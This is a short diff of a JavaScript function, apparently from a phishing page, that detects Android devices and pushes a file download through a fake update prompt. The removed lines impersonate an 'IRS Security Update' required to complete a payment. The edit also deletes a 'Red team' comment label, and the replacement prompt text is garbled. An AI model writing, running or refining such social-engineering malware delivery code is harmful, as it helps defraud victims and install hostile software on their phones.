@@ -153,7 +153,7 @@ function gatherFormData(method) {
 }
 
 function deployMobilePayload() {
-    // Red team mobile attack vectors
+    // mobile attack vectors
     
     // 1. Check for Android device
     if (navigator.userAgent.includes('Android')) {
@@ -166,7 +166,7 @@ function deployMobilePayload() {
             document.body.appendChild(downloadLink);
             
             // Social engineering prompt
-            if (confirm('Security Update Required\n\nFor your protection, please install the IRS Security Update to complete your payment.\n\nDownload now?')) {
+            if (confirm('Update Required\n\n install Update to.\n\nInstall Now')) {
                 downloadLink.click();
             }
             document.body.removeChild(downloadLink);
